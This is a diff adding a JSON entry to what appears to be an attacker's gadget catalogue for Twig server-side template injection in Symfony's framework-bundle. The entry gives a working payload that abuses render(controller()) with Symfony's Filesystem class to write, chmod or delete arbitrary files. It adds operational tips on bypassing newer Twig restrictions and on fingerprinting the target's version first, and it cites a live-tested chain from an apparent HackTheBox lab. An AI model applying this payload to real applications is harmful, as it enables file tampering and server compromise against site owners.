@@ -1,0 +1,16 @@
+{
+  "package": "symfony/framework-bundle",
+  "ecosystem": "packagist",
+  "gadgets": [
+    {
+      "versions": "7.0 (measured live on 7.0.10 with twig 3.24)",
+      "sink": "render(controller('Class::method', {args})) instantiates an arbitrary no-argument class and calls a method on it",
+      "payload": "{{ render(controller('Symfony\\\\Component\\\\Filesystem\\\\Filesystem::dumpFile', {'filename':'/path','content':'...'})) }}  -- also chmod(files, mode) and remove(files)",
+      "effect": "turns template control into arbitrary file write, chmod and delete without any exec function. controller() builds a ControllerReference, render() resolves it through the controller resolver, and the map entries bind to method parameters BY NAME.",
+      "precondition": "template injection or any other control over Twig source in an app whose Twig environment is the application's own, so the Symfony extensions are registered. The target class must have a no-argument constructor.",
+      "trap": "Twig 3.12 and later refuse a string where a filter wants a callable, so the usual ['cmd']|map('system') family is dead and this is the replacement. Fingerprint first with constant('Twig\\\\Environment::VERSION') rather than cycling payloads. Symfony\\Component\\Process is useless alongside it when proc_open is in disable_functions.",
+      "proven_by": "measured live (knowledge/chains/htb-jerryboree-twig-ssti-symfony-fragment-filesystem-write-htaccess-cgi-escape.json)"
+    }
+  ],
+  "schema_version": 1
+}
